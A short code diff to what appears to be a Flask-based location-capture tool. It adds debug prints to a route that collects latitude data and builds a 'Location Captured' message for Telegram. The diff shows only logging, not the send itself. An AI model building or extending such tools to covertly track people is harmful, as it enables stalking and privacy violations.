@@ -142,7 +142,10 @@ def update_location():
     data = request.json
     chat_id = request.args.get('id', '')
     
+    print(f"{G}[+] {C}UPDATE_LOCATIN_CALLED{W}")
+
     if chat_id in active_sessions:
+        print(f"{G}[+] {C}Sending now...{W}")
         # Send location data to Telegram
         msg = f"🌍 *Location Captured*\n\n"
         msg += f"📍 *Latitude*: `{data.get('lat', 'Unknown')}`\n"
